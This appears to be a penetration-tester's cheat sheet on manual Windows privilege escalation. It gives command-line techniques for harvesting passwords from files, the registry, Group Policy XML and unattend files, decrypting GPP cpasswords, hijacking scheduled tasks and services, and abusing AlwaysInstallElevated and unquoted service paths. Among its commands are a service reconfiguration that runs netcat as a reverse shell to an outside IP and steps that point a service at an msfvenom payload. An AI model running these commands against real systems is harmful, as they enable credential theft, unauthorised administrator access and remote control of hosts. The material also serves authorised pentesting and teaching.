---
description: manual techniques for privilege escalation
---

# Windows

## Information Gathering

First step should always be Situational Awareness, understand what's on the host. Please use those commands first to understand what you're against.

[Windows Situational Awareness Guide](../situational-awareness/windows/)

## Common commands&#x20;

### **Find passwords/config files**

`dir/s *pass* == *cred* == *vnc* == *.config* `

`findstr /si` `password *.xml *.ini*.txt `

`/i -`incase sensitive ,`  /s  `- search subdirectories

`reg query HKLM(HKCU) /f password /t REG_SZ /s `&#x20;

### **Find password in registry**

`reg query HKLM /f password /t REG_SZ /s > HKLM.txt `

`reg query HKCU /f password /t REG_SZ /s > HLCU.txt`

**Note: **be careful querying the registry as there is usually alerting tied to it

#### VNC

`reg query "HKCU\Software\ORL\WinVNC3\Password"`

#### Windows autologin

`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`

#### SNMP Parameters

`reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"`

#### Putty

`reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"`

### search files

`dir file.txt /s /p`

The /s option directs a search of all folders on the hard drive; the /p option pauses the display after each screen of text.

can also do `dir *.txt /s /p`

search in a file:

`find /i TEXT C:\*.txt`

/i - incase sensetive

**Find based on Regular expressions **

`findstr /Ri /c:"user-." .txt file.txt:user-0111`

### findstr commands

```
Key
   string(s)    Text to search for, each word a separate search.
   pathname(s)  The file(s) to search. 
   /C:string    Use string as a literal search string (may include spaces).
   /R           Evaluate as a regular expression.
   /R /C:string  Use string as a regular expression.
   /G:StringsFile  Get search string from a file (/ stands for console).
   /F:file      Get a list of filename(s) to search from a file (/ stands for console).
   /d:dirlist   Search a comma-delimited list of directories.
   /A:color     Display filenames in colour (2 hex digits)

options can be any combination of the following switches:

   /I   Case-insensitive search.
   /S   Search subfolders.
   /P   Skip any file that contains non-printable characters
   /OFF[LINE] Do not skip files with the OffLine attribute set.
   /L   Use search string(s) literally.
   /B   Match pattern if at the Beginning of a line.
   /E   Match pattern if at the END of a line.
   /X   Print lines that match exactly.
   /V   Print only lines that do NOT contain a match.
   /N   Print the line number before each line that matches.
   /M   Print only the filename if a file contains a match.
   /O   Print character offset before each matching line.
```

## Missing KB's

Search for any vulnaribilies that weren't patched, and the patch wasn't applid to the host.

### Manually&#x20;

Use wmi to find what patches were applied:

`wmic qfe get Caption,Description,HotFixID,InstalledOn`

And find the patches that were not applied yet (shows as 'update')

### Seatbelt

[Seatbelt ](../automated-tools.md#seatbelt)can enumerate missing patches.

#### Metasploit

Use `use post/windows/gather/enum_patches`

## GPP Passwords

Group Policy Preference (GPP) is created, there’s an xml file created in the SYSVOL share with that config data, including any passwords associated with the GPP. For security, Microsoft AES encrypts the password before it’s stored as cpassword. But then Microsoft [published the key](https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx) on MSDN&#x20;

### Manual

Find the Domain Controller and browse to `\\DC\SYSVOL\` find all the passwords by searching the following files:

```
Get-ChildItem -Path "\\$Server\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'
```

&#x20;obtain the value of the attribute **cpassword**.

### Metasploit

`post/windows/gather/credentials/gpp`

### PowerSploit

Use the `Get-GPPPassword `which is under Exfiltration&#x20;

Or the  `Get-CachedGPPPassword `For locally stored GP Files which is part of 'PowerView'

### Decrypt

Decrypt the password using the Kali built in tool called gpp-decrypt that will do it:&#x20;

`root@kali:~# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ `\
`GPPstillStandingStrong2k18`&#x20;

## Scheduled tasks

We are looking for tasks that are run by a privileged user and we can change their commands or paths.

**Open task scheduler:**

taskschd.msc

control schedtasks

**Output for all tasks: **

`schtasks /query /fo LIST /v > tasks.txt `

Or in a Table:

`schtasks /query /fo TABLE`

**Specific task: **

`schtasks/query /fo LIST /v /tn TaskName `

**Start Scheduled tasks:**

`PS> Start-ScheduledTask -TaskName "ScanSoftware"`

**Stop Scheduled task:**

`PS> Stop-ScheduledTask -TaskName "ScanSoftware"`

**PowerUP**

`Get-ModifiableScheduledTaskFile`

```
Start-ScheduledTask -TaskName "ScanSoftware"
Start-ScheduledTask -TaskName "Don't_Kill_Me3"
schtasks /run /tn "task name"
End Task
schtasks /end /tn "task name"
Get Task Info
Get-ScheduledTaskInfo -TaskName "Don't_Kill_Me3"
schtasks /query /tn "Don't_Kill_Me3" /FO list /v
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr "Task To Run"
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
View running tasks
get-scheduledtask | ? state -eq running
Modifying a scheduled task
schtasks.exe /change /tn "Don't_Kill_Me3" /tr:c:\windows\system32\cmd.exe
copy c:\Users\administrator\XblGameSaveTask.exe c:\Windows\System32\XblGameSaveTask.exe
$Act1 = New-ScheduledTaskAction -Execute "C:\windows\system32\Notepad.exe"
Set-ScheduledTask "Don't_Kill_Me3" -Action $Act1
accesschk.exe /accepteula -quvw C:\Users\Administrator\Desktop\Backup.ps1
FILE_ALL_ACCESS
```

## Weak Service Permissions

[More information under 'Running services'](running-services.md)

### Check Permission

#### Manual

#### View current services:

`net start`

**Viewing Service ACLs using powershell**

Use the Get-[ServiceACL ](broken-reference)script, and run:

`'FakeService' | Get‐ServiceAcl | Select‐Object ‐ExpandProperty Access`

If the service permissions allow us to start stop or change config we can modify the service permissions.

#### Accesschk

#### Checking Permissions

Can be done using [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) - a sysinternal tool

**Checking Folder Permissions: **

`accesschk.exe -dqv C:\Some\Path `

`accesschk.exe -dvq UserGroup c:\ `

#### **Checking Service Permissions: **

`accesschk.exe -ucqv ServiceName `

`accesschk.exe -ucvq* <Any_Service> `

**Check Service Write Access**:&#x20;

`accesschk.exe -uwcqv UserGroup* `

#### Changing Service Configuration&#x20;

Let's enumerate services with accesschk from SysInternals and look for SERVICE\_ALL\_ACCESS or  SERVICE\_CHANGE\_CONFIG as these privileges allow attackers to modify service configuration:&#x20;

`accesschk.exe /accepteula -ucv "user" evilsvc `

`accesschk.exe /accepteula -uwcqv "Authenticated Users" * `

We can see the user 'user' has 'SERVICE\_ALL\_ACCESS' to the service 'evilsec'&#x20;

**Create a malicious binary using msfvenom and point the services: **

`.\sc.exe config evilsvc binpath= "c:\program.exe" `

(Run hanlder)&#x20;

Start the service:&#x20;

`.\sc.exe start evilsvc `

Or&#x20;

`net stop [service name] && net start [service name]. `

### Metasploit script

exploit/windows/local/service\_permissions&#x20;

### Manual

\# **NOTE: spaces are mandatory for this exploit to work ! **

```
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.0.73 4343 -e C:\WINDOWS\System32\cmd.exe" 
sc qc upnphost 
sc stop upnphost
sc start upnphost
```

### Srvcheck3&#x20;

```
C:\Users\hacker\Downloads>.\srvcheck3.exe -l 
 Srvcheck 3 - Windows Services ACL permission Scanner 
 (c) 2006 - 2008 Andres Tarasco - atarasco@gmail.com 
 * PRIVATE BUILD for PENTESTERS - 
http://www.tarasco.org
 
[+] Listing Vulnerable Services... 
    [Apache2.4]         Apache2.4 
    Status: 0x4 
    Context:            LocalSystem 
    Parameter:          "c:\xampp\apache\bin\httpd.exe" -k runservice 
[+] Analyzed 400 Services in your system 
[+] You were Lucky. 1 vulnerable services found 
```



### Resource

* [https://www.ired.team/offensive-security/privilege-escalation/weak-service-permissions](https://www.ired.team/offensive-security/privilege-escalation/weak-service-permissions)



## AlwaysInstallElevated

Group Policy Setting that allows any \*.msi to install with elevated privilege&#x20;

Attack: Compile payload as \*.msi&#x20;

The easiest method to determine if this issue exist on the host is to query the following registry keys:&#x20;

`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`&#x20;

### Metasploit&#x20;

The easiest and the fastest way to escalate privileges is via the Metasploit Framework which contains a module that can generate an MSI package with a simple payload that it will be executed as SYSTEM on the target host and it will be removed automatically to prevent the installation of being registered with the operating system.&#x20;

![Metasploit Module - Always-Install-Elevated](https://firebasestorage.googleapis.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-M4xwp6Mq18nX8yR4M5z%2Fuploads%2FEq202PDcApaOlXHp3Fa5%2Ffile.png?alt=media)

### PowerSploit&#x20;

PowerSploit framework contains a script that can discover whether this issue exist on the host by checking the registry entries and another one that can generate an MSI file that will add a user account into the local administrators group.&#x20;

![PowerSploit - Always Install Elevated](https://firebasestorage.googleapis.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-M4xwp6Mq18nX8yR4M5z%2Fuploads%2FyAdPFXBr2QpqoHAVHPxj%2Ffile.png?alt=media)

## Unquoted services

**Example for vulnerable paths: **

`C:\Defcon\Vuln` Folder 1\anything.exe&#x20;

`C:\Defcon\Vuln Folder` 1\anything.exe&#x20;

`C:\Defcon\Vuln Folder 1\anything.exe `

**Searching for Unquoted Service Paths: **

Cmd:&#x20;

`wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """ `

Powershell:&#x20;

```
beacon> powerpick gwmi win32_service | ?{$_} | where {($_.pathname -ne $null) -and ($_.pathname.trim() -ne "")} | where {-not $_.pathname.StartsWith("`"")} | where {($_.pathname.Substring(0, $_.pathname.IndexOf(".exe") + 4)) -match ". ."}
[*] Tasked beacon to run: gwmi win32_service | ?{$_} | where {($_.pathname -ne $null) -and ($_.pathname.trim() -ne "")} | where {-not $_.pathname.StartsWith("`"")} | where {($_.pathname.Substring(0, $_.pathname.IndexOf(".exe") + 4)) -match ". ."} (unmanaged)
[+] host called home, sent: 134767 bytes
[+] received output:


ExitCode  : 1067
Name      : CYBERFwSvc
ProcessId : 0
StartMode : Auto
State     : Stopped
Status    : OK

```

It is very common for administrators to use Windows Deployment Services in order to create an image of a Windows operating system and deploy this image in various systems through the network. This is called unattended installation.

The problem with unattended installations is that the local administrator password is stored in various locations either in plaintext or as Base-64 encoded. These locations are:

```
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

Credit; [https://pentestlab.blog/2017/04/19/stored-credentials/](https://pentestlab.blog/2017/04/19/stored-credentials/)

### Metasploit

&#x20;`post/windows/gather/enum_unattend`

## Resources

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

